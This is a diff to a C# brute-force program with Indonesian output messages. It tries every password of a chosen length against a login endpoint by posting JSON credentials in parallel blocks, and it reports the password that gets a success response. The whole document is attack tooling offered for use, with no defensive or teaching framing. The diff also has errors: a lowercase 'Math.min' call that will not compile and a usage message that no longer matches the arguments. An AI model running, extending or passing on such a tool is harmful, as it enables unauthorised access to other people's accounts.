@@ -11,7 +11,6 @@ class BruteForcePerLength {
     static volatile bool found = false;
     static object lockObj = new object();
 
-    static ConcurrentQueue<(long start, long end)> taskQueue = new ConcurrentQueue<(long, long)>();
     static long TotalCombinations(int length) => (long)Math.Pow(charset.Length, length);
 
     static string FromIndex(long idx, int length) {
@@ -23,9 +22,8 @@ class BruteForcePerLength {
         return new string(pwd);
     }
 
-    static async Task<bool> TestPasswordAsync(string password, int workerId) {
-        using (var client = new HttpClient())
-        {
+    static async Task<bool> TestPasswordAsync(string password, int blockId) {
+        using (var client = new HttpClient()) {
             var payload = $"{{\"username\":\"{username}\",\"password\":\"{password}\"}}";
             var content = new StringContent(payload, Encoding.UTF8, "application/json");
             try {
@@ -33,56 +31,54 @@ class BruteForcePerLength {
                 var result = await response.Content.ReadAsStringAsync();
                 if (response.IsSuccessStatusCode && result.Contains("\"success\":true")) {
                     lock (lockObj) {
-                        Console.WriteLine($"\n[Worker-{workerId}] SUKSES! Username: {username}, Password: {password}\n");
+                        Console.WriteLine($"\n[Block-{blockId}] SUKSES! Username: {username}, Password: {password}\n");
                     }
                     found = true;
                     return true;
                 }
-            } catch (Exception ex) {
-                lock (lockObj) {
-                    Console.WriteLine($"\n[Worker-{workerId}] Error: {ex.Message}");
-                }
-                return false;
-            }
+            } catch { }
+            return false;
         }
-        return false;
     }
 
-    static async Task Worker(int workerId, int length) {
-        while (!found && taskQueue.TryDequeue(out var block)) {
-            for (long idx = block.start; idx < block.end && !found; idx++) {
-                string password = FromIndex(idx, length);
-                lock (lockObj) {
-                    Console.WriteLine($"[Worker-{workerId}] Trying: {password}");
-                }
-                if (await TestPasswordAsync(password, workerId)) break;
+    static async Task Worker(long start, long end, int length, int blockId) {
+        for (long idx = start; idx < end && !found; idx++) {
+            string password = FromIndex(idx, length);
+            lock (lockObj) {
+                Console.WriteLine($"[Block-{blockId}] Trying: {password}");
             }
+            if (await TestPasswordAsync(password, blockId)) break;
         }
+    }
+
+    static int BlocksForLength(int length, int baseLength = 4, int maxBlocks = 128){
+      int baseBlocks = 2;
+      int diff = length - baseLength;
+      if (diff < 0) return baseBlocks;
+      int blocks = baseBlocks * (int)Math.Pow(2, diff);
+      return Math.min(blocks, maxBlocks);
     }
 
     static async Task Main(string[] args) {
-        if (args.Length < 2) {
+        if (args.Length < 1) {
             Console.WriteLine("Usage: dotnet run -- length blocks\nContoh: dotnet run -- 4 16");
             return;
         }
-
         int length = int.Parse(args[0]);
-        int nBlocks = int.Parse(args[1]);
+        int nBlocks = BlocksForLength(length);
         long totalCombo = TotalCombinations(length);
-        double blockSize = (double)totalCombo / nBlocks;
-
-        for (int i = 0; i < nBlocks; i++) {
-            long start = (long)Math.Floor(i * blockSize);
-            long end = (long)Math.Floor((i + 1) * blockSize);
-            taskQueue.Enqueue((start, end));
-        }
+        long blockSize = totalCombo / nBlocks;
         Task[] tasks = new Task[nBlocks];
+
+        Console.WriteLine($"PASSWORD LENGTH: {length}, TOTAL COMBOS: {totalCombo}, BLOCKS: {nBlocks}, BLOCKSIZE: {blockSize}");
         for (int i = 0; i < nBlocks; i++) {
-            int workerId = i + 1;
-            tasks[i] = Worker(workerId, length);
+            long start = i * blockSize;
+            long end = (i == nBlocks - 1) ? totalCombo : (i + 1) * blockSize;
+            int blockId = i + 1;
+            tasks[i] = Worker(start, end, length, blockId);
         }
         await Task.WhenAll(tasks);
         if (!found)
-            Console.WriteLine("Selesai. Password tidak ditemukan di blok yang diuji.");
+            Console.WriteLine("Selesai. Tidak ditemukan di blok ini.");
     }
 }
